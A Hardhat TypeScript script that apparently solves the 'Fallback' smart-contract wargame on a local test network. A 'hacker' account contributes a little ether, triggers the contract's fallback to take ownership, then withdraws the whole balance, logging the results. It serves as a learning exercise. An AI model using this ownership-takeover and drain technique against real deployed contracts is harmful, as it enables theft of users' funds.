const hre = require("hardhat");
const {waffle} = require("hardhat");

import { Signer } from "ethers";
const ethers = hre.ethers;
const provider = waffle.provider;

async function main(){
    let user: Signer, hacker: Signer;
    let fallback, Fallback;

    [user, hacker] = await ethers.getSigners();

    Fallback = await ethers.getContractFactory("Fallback");
    fallback = await Fallback.deploy();
    await fallback.deployed();

    const tx = {
        from: await hacker.getAddress(),
        to: fallback.address,
        value: ethers.utils.parseEther("1")
    }
    console.log('User address', await user.getAddress());

    await fallback.connect(hacker).contribute(
        {value: ethers.utils.parseEther("0.0005")}
    );
    await fallback.connect(user).contribute(
        {value: ethers.utils.parseEther("0.0005")}
    );
    await user.sendTransaction({
        from: await user.getAddress(),
        to: fallback.address,
        value: ethers.utils.parseEther("100")
    });


    console.log("Initial state, fallback owner is", await fallback.owner());
    console.log("Fallback balance is", await provider.getBalance(fallback.address));
    console.log("Hacker balance is", await ethers.utils.formatEther((await provider.getBalance(await hacker.getAddress())).toString()));

    console.log('\n\n\nAttacking...\n----------');
    await hacker.sendTransaction(tx);
    console.log("Afterwards, fallback owner is", await fallback.owner())
    await fallback.connect(hacker).withdraw();
    console.log("Fallback balance is", await provider.getBalance(fallback.address));
    console.log("Hacker balance is", await ethers.utils.formatEther((await provider.getBalance(await hacker.getAddress())).toString()));

}

main().then(()=>process.exit(0))
    .catch((err)=>{
        console.log(err);
        process.exit(1);
    })
    